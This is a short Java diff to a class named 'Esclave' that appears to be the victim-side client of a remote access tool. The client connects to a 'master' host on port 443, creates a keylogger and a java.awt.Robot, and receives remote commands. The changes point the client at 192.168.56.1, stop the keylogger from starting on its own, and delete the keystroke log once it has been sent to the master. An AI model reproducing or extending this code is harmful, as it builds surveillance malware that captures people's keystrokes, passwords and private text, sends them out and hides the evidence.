@@ -21,7 +21,7 @@ import constante.Constante;
 public class Esclave {
 
 	private final static int portMaitre = 443;
-	private final static String addresseMaitre = "localhost";
+	private final static String addresseMaitre = "192.168.56.1";
 	private static InetAddress addresse;
 
 	private static ObjectInputStream in;
@@ -57,7 +57,6 @@ public class Esclave {
 					+ user_country);
 			out.flush();
 			klgg = new Keylogging(this);
-			klgg.start();
 			robot = new Robot();
 			this.receive(this);
 		} catch (AWTException | IOException e) {
@@ -153,6 +152,7 @@ public class Esclave {
 		String chemin = Keylogging.cheminFile;
 		klgg.arreteKeylog();
 		SendSpecificObject.sendFile(chemin, out);
+		klgg.supprimerFichier();
 		klgg = new Keylogging(this);
 	}
 
